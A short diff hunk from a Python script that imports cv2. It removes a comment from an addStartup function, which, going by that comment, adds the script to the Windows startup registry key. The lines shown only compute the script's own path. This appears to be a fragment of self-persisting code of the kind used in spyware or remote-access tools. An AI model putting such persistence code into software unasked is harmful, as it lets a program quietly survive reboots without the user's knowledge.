@@ -16,7 +16,7 @@ import cv2
                                                   
 """
 
-def addStartup():  # this will add the file to the startup registry key
+def addStartup(): 
     fp = os.path.dirname(os.path.realpath(__file__))
     file_name = sys.argv[0].split('\\')[-1]
     new_file_path = fp + '\\' + file_name
